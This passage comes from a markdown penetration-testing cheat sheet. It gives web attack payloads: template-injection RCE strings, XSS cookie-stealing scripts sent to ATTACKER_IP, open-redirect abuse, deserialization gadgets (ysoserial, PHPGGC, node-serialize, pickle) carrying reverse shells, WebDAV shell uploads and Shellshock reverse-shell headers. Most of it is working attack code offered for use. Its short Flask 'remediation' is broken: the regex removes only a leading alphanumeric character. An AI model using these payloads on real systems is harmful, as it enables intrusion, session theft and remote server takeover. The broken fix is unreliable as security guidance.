"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
).read()}}
{%endif%}{% endfor %}
```

#### Twig (PHP) Exploitation

```php
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

#### FreeMarker (Java) Exploitation

```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

#### Remediation (Flask example)

```python
import re
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route("/profile/<user>")
def profile_page(user):
    user = re.sub("^[A-Za-z0-9]", "", user)  # strip non-alphanumeric
    template = f"<h1>Welcome to the profile of {{user}}!</h1>"
    return render_template_string(template)
```

***

### Session Hijacking & Unvalidated Redirects

#### Session Hijacking Methods

| Method               | Description                            |
| -------------------- | -------------------------------------- |
| **Network sniffing** | Capture cookie over HTTP (unencrypted) |
| **Browser malware**  | Steal cookies locally                  |
| **XSS**              | JS payload sends cookie to attacker    |
| **Session fixation** | Force victim to use known session ID   |

#### Cookie Theft via XSS

```javascript
// Method 1 — Image beacon
<script>var i=new Image(); i.src="http://ATTACKER_IP/?c="+document.cookie;</script>

// Method 2 — Fetch API
<script>fetch('http://ATTACKER_IP/?c='+btoa(document.cookie));</script>

// Method 3 — Window redirect
<script>window.location='http://ATTACKER_IP/?c='+document.cookie</script>

// Method 4 — img onerror
<img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">

// Steal page content via XHR (bypass HTTPOnly)
<script>
var req = new XMLHttpRequest();
req.onload = function(){
  new Image().src='http://ATTACKER_IP/?data='+btoa(this.responseText);
};
req.open('GET','http://target.com/account',false);
req.send();
</script>
```

***

#### Unvalidated Redirects

```
# Legit redirect
https://target.com/ordering.php?redirect=http://target.com/thankyou.htm

# Malicious redirect to phishing page
https://target.com/ordering.php?redirect=http://attacker.com/phishing.htm

# OAuth token theft via open redirect
https://target.com/oauth?redirect_uri=https://target.com/redirect?to=https://attacker.com
```

***

### Insecure Deserialization

#### Concept

* **Serialization** = Converting object to transmittable format (JSON, binary, base64)
* **Deserialization** = Reconstructing object from that format
* **Vulnerability** = Attacker sends crafted serialized data → application deserializes and executes malicious commands

***

#### Java Deserialization — ysoserial

```bash
# Repository
git clone https://github.com/frohoff/ysoserial

# Generate payload
java -jar ysoserial.jar [payload-type] [command] > output.bin

# List all payload types
java -jar ysoserial.jar

# Netcat reverse shell payload
java -jar ysoserial-master.jar Groovy1 'nc ATTACKER_IP PORT' > payload.bin

# CommonsCollections (most common gadget)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER_IP/?x=$(id)" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > payload.bin
```

**Identification:** Look for `rO0AB` in base64 or `0xACED 0x0005` in hex = Java serialized object

**Burp Extension:** [Java Deserialization Scanner](https://github.com/federicodotta/Java-Deserialization-Scanner)

***

#### &#x20;PHP Deserialization — PHPGGC

```bash
# Repository
git clone https://github.com/ambionics/phpggc

# List supported frameworks
./phpggc -l

# View exploit info for specific gadget
./phpggc -i monolog/rce1

# Generate RCE payload
./phpggc monolog/rce1 assert 'phpinfo()'
./phpggc monolog/rce2 exec 'id > /tmp/pwned'

# Common frameworks supported: Laravel, Symfony, Yii, Zend, Drupal, Guzzle
```

***

#### Node.js Deserialization

```json
// Malicious JSON payload (node-serialize module)
// Change IP and PORT before using
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

```bash
# Base64 encode the payload
echo -n '{"rce":"_$$ND_FUNC$$_..."}' | base64

# Send as cookie via Burp Suite
Cookie: profile=BASE64_ENCODED_PAYLOAD
```

***

#### Python Pickle Deserialization

```python
# Vulnerable code pattern
import pickle
data = pickle.loads(user_supplied_data)   # dangerous!

# Identify: look for base64 cookies that decode to binary starting with \x80\x04\x95

# Malicious pickle payload
import pickle, os

class Exploit(object):
    def __reduce__(self):
        cmd = ("mkfifo /tmp/p; nc ATTACKER_IP PORT 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p")
        return os.system, (cmd,)

payload = pickle.dumps(Exploit())
import base64
print(base64.b64encode(payload))
# Send this base64 as the cookie value

# Combine with SQL injection (print payload to console)
def __reduce__(self):
    import os
    cmd = ("mkfifo /tmp/p; nc ATTACKER_IP PORT 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p")
    return os.system, (cmd,)
```

***

### WebDAV & Shellshock

#### WebDAV

```bash
# WebDAV config location
/etc/apache2/sites-enabled/000-default.conf
/var/www/html/

# Connect and manage files with cadaver
cadaver http://target.com/webdav/

# Upload a shell
cadaver> put shell.php

# Or with curl
curl -T shell.php http://target.com/webdav/shell.php

# Then trigger shell
curl http://target.com/webdav/shell.php?cmd=id
```

***

#### CGI Shellshock (CVE-2014-6271)

```bash
# Find .cgi page and test with malicious User-Agent
curl -k -H "user-agent: () { :; }; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" \
  https://target.com/cgi-bin/session_login.cgi

# Alternative payload in User-Agent
() { :; }; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Via Burp Suite — replace User-Agent header with above payload
```

***

### Resources

| Resource                   | Link                                                                            |
| -------------------------- | ------------------------------------------------------------------------------- |
| XSS Cheat Sheet            | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet           |
| XSS Payloads               | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection |
| Command Injection Payloads | https://github.com/payloadbox/command-injection-payload-list                    |
| ysoserial                  | https://github.com/frohoff/ysoserial                                            |
| PHPGGC                     | https://github.com/ambionics/phpggc                                             |
| jwt\_tool                  | https://github.com/ticarpi/jwt\_tool                                            |
| XXE.sh                     | https://www.xxe.sh/                                                             |
| 230-OOB (Blind XXE)        | https://github.com/lc/230-OOB                                                   |
| PayloadsAllTheThings       | https://github.com/swisskyrepo/PayloadsAllTheThings                             |
| OWASP Testing Guide        | https://owasp.org/www-project-web-security-testing-guide/                       |
